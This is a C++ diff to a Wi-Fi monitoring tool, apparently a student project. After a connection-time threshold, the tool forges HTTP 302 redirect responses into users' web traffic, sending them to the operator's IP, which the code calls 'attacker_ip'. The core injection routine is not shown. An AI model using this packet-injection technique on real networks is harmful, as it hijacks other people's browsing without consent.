@@ -38,43 +38,57 @@ void print_time(int input_time,struct timeval tv)
 
     printf("%d시간 %d분 %d초",tm_hour,tm_min,tm_sec);
 }
-/*void get_my_addr(const char*ifname,uint8_t*outputmymac)
-{
-    int s = socket(AF_INET, SOCK_DGRAM, 0);
-    if(s < 0)
-        perror("socket fail");
-    struct ifreq ifr;
-    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
-    if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
-        perror("ioctl fail");
-    memcpy(outputmymac,ifr.ifr_hwaddr.sa_data,6);
-}*/
+
 int main(int argc, char *argv[])
 {
+    const char f_rd[41] = "HTTP/1.0 302 Redirect\r\nLocation: http://";
+    const char l_rd[5] = "\r\n\r\n";
+
     char *dev =  argv[1];
     uint8_t ap_mac[6];
-    mac_changer(argv[2],ap_mac);
-    const char *send_dev = "wlan0";
+    uint8_t attacker_mac[6];
+    mac_changer(argv[3],ap_mac);
+    char *send_dev = argv[2];
+    char attacker_ip[16];
+    int rd_length = 0;
+    char rd_msg[80] = "0";
+    uint32_t u32_attacker_ip;
 
     map<Mac,user_info_value>user_info;
     map<Mac,user_info_value>::iterator ui_iter;
 
     Mac user_mac;
 
-    if(argc < 3)
+    if(argc < 4)
         {
             printf("Input argument error!\n");
             if (dev == NULL)
             {
-                printf("Input your <dev><AP_Mac_Address>\n");
-                printf("EX : Wlan1 AA:BB:CC:DD:EE:FF");
+                printf("Input your <dev><send dev><AP_Mac_Address>\n");
+                printf("EX : tap0 wlan0 AA:BB:CC:DD:EE:FF");
                 exit(1);
             }
         }
         else
         {
-        printf("DEV : %s\n", dev);
-        printf("AP_MAC : %s\n",argv[2]);
+        get_my_addr(send_dev,attacker_ip,attacker_mac);     //get my mac & ip address
+        inet_pton(AF_INET,attacker_ip,&u32_attacker_ip);    //convert char to u32
+        rd_length = strlen(attacker_ip);
+        memcpy(rd_msg,f_rd,40);
+        memcpy(rd_msg+40,attacker_ip,rd_length);
+        memcpy(rd_msg+40+rd_length,l_rd,5);
+        rd_length = strlen(rd_msg);
+
+        printf("Monitor DEV : %s\n", dev);
+        printf("Send DEV : %s\n", argv[2]);
+        printf("AP_MAC : %s\n",argv[3]);
+        printf("Sender_MAC :");
+        for(int i=0;i<5;i++)
+            printf("%02x:",attacker_mac[i]);
+        printf("%02x\n",attacker_mac[5]);
+        printf("Sender_IP : %s\n",attacker_ip);
+        printf("Waiting http packet of Users...");
+
 
         const u_char *pkt_data;
         int res;
@@ -124,8 +138,7 @@ int main(int argc, char *argv[])
                             bl_hour = diff_t / (60*60);
                             diff_t -= ( bl_hour *60 *60);
 
-                            //if(bl_hour>2)   //http_injection이 실행된 지 2시간이 경과했으면 실행
-                            if(true)
+                            if(bl_hour>1)   //http_injection이 실행된 지 2시간이 경과했으면 실행
                             {
                                 uint16_t etype = ntohs(eh->ether_type);
                                 if(etype == ETHERTYPE_IP)
@@ -139,7 +152,7 @@ int main(int argc, char *argv[])
                                         pkt_data += tcph->doff*4;
                                         pkt_length -= tcph->doff*4;
                                         jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;
-                                        if(pkt_length >0)
+                                        if(pkt_length > 0 && iph->ip_dst.s_addr != u32_attacker_ip) //목적지 ip 주소가 공격자의 주소가 아닐 경우에만 실행
                                         {
                                             u_int32_t *u32_get;
                                             u32_get = (u_int32_t*)pkt_data;
@@ -147,9 +160,9 @@ int main(int argc, char *argv[])
                                             {
                                                 pkt_data -= jump_pointer;   //http_injection을 하기 위해서 패킷 포인터를 원래대로 셋팅한다
                                                 pkt_length += jump_pointer;
-                                                if(http_injection(fp,pkt_data,pkt_length)==1)
-                                                    printf("injection!\n");
+                                                if(http_injection(fp2,pkt_data,pkt_length,attacker_mac,rd_msg,rd_length)==1)
                                                     //ui_iter->second.block_time = pkt_header->ts.tv_sec; //http_injection의 정상 실행됐을 경우, block_time을 실행한 시간으로 갱신한다.
+                                                    printf("a\n");
                                             }
                                         }
                                     }
@@ -165,8 +178,8 @@ int main(int argc, char *argv[])
                         }   //user_mac이 없을 경우, MAP에 추가하는 else문
                     }   //ap mac주소가 일치하는지 if문
                 }   //패킷을 정상적으로 받아 왔을 경우 실행되는 else문
-/*                sleep(1);
-                system("clear");
+//                sleep(1);
+/*                system("clear");
                 cout<<"User_Mac\t\tAfter Block Time\tLast Connection Time"<<endl;
                 for(ui_iter = user_info.begin(); ui_iter!=user_info.end(); advance(ui_iter,1))
                 {
